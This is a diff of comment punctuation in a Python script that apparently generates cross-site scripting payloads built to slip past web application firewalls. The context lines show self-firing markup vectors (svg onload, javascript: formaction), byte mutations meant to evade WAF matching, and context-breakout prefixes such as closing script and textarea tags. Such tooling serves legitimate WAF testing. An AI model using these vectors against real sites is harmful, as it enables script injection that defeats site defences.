@@ -6,7 +6,7 @@ that both bypass the WAF AND execute. This emits a broad set of self-firing
 markup vectors (handler x element, plus light execution-preserving mutations)
 and context-breakout vectors for the RCDATA/RAWTEXT/attribute/JS sinks. The
 detonation oracle in `wafrift exploit` filters to the ones that actually run, so
-over-generation is safe — only genuine executors are counted.
+over-generation is safe (only genuine executors are counted).
 
 Usage:
   python3 generate_corpus.py > corpus_generated.txt
@@ -16,7 +16,7 @@ Usage:
 
 MARK = "alert(1)"
 
-# (element, attributes-that-make-it-fire) — each fires with NO user interaction
+# (element, attributes-that-make-it-fire), each fires with NO user interaction
 # in a headless browser when parser-inserted (server-rendered markup).
 AUTOFIRE = [
     ("svg", "onload={M}"),
@@ -47,7 +47,7 @@ AUTOFIRE = [
     ("form", "><button formaction=javascript:{M}>x"),
 ]
 
-# Light execution-preserving mutations applied to each base tag opener — each
+# Light execution-preserving mutations applied to each base tag opener, each
 # keeps the vector firing but changes the bytes (so it is a distinct payload and
 # a distinct thing for the WAF to (not) match).
 def mutate(tag: str, attrs: str):
@@ -64,7 +64,7 @@ def mutate(tag: str, attrs: str):
         yield f"<{tag[0].upper()}{tag[1:]} {a}>"
 
 
-# Context-breakout prefixes — re-enter markup from RCDATA / RAWTEXT / attribute /
+# Context-breakout prefixes, re-enter markup from RCDATA / RAWTEXT / attribute /
 # JS-string / comment sinks, then drop a known auto-firing tag.
 BREAKOUTS = [
     "</title>", "</textarea>", "</style>", "</script>", "</noscript>",
